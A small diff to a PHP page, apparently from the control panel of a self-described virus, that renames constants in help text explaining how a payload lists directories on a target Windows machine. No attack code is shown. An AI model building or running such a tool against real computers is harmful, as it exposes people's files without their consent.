@@ -6,10 +6,10 @@ use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExploreDir\ExploreDir;
 
 <p>Place the directory you want to explore above. If the directory to explore has too many files and folders
     to go through, the virus will automatically stop the payload
-    after <?php echo ExploreDir::$maxLines ?>
+    after <?php echo ExploreDir::MAX_LINES ?>
     files and folders. You can limit the depth the virus will explore (and in turn, will cover more, but
     shallower folders) by specifying it in the max depth field above. The default
-    is <?php echo ExploreDir::$defaultDepth; ?> which I think is effectively infinity on most computers.</p>
+    is <?php echo ExploreDir::DEFAULT_DEPTH; ?> which I think is effectively infinity on most computers.</p>
 <p>Also please note that exploring directories can take a long time so please be patient. Here are a list of
     benchmarks to help you gauge how long it takes:</p>
 <ul>
